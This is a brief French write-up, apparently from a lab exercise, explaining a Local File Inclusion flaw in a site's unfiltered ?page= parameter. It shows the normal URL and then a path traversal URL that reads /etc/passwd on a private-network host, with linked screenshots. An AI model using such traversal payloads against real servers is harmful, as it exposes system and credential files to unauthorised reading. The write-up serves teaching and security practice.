Exploiter un mauvais filtrage de paramètre pour lire des fichiers du serveur.
Le paramètre ?page= du site permet d’inclure des fichiers sans filtrage.
Cela permet de lire n’importe quel fichier du système LFI : Local File Inclusion.

http://192.168.1.87/?page=home


<img width="941" height="541" alt="image" src="https://github.com/user-attachments/assets/42375834-a30b-4d56-bdc3-1f2a17ea8a7b" />


http://192.168.1.87/?page=../../../../etc/passwd


<img width="1011" height="632" alt="image" src="https://github.com/user-attachments/assets/c1966822-3fea-4dca-81dc-477235eb9dce" />
